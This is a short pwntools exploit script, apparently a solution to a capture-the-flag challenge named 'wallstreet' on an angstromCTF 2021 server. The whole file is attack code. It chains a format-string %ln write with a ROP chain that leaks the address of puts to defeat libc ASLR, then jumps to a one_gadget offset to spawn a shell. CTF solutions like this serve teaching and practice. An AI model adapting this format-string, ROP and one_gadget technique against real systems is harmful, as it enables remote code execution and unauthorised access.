from pwn import *

e = ELF("./wallstreet")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.2021.chall.actf.co", 21800)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter("!", "1")
debug()
p.sendlineafter("?", str(0x220 / 8))

prdi = 0x004015c3    
prsi = 0x004015c1
pr12 = 0x004015bc        

p.sendlineafter("token?", (b"%" + bytes(str(0x4040e0 + 0x40 - 8), "ascii") + b"c" + b"%73$ln;;;").ljust(0x40, b"\x00") 
  + p64(prdi) + p64(e.got["puts"])
  + p64(e.symbols["puts"])
  + p64(0x4013ea)
)


p.recvuntil(";;;")

p.recvline()

leak = u64(p.recvline(keepends=False).ljust(8, b"\x00")) - libc.symbols["puts"]
print(hex(leak))

p.sendline(b"\x00" * 0x40 + b"\x00" * 0x18 
  + p64(pr12) + p64(0) * 4
  + p64(leak + 0xdf54c)
)

#p64(e.symbols["main"])) #p64(prdi + 1) * (0x200/8 + 1) + p64(prdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["puts"]))

p.interactive()
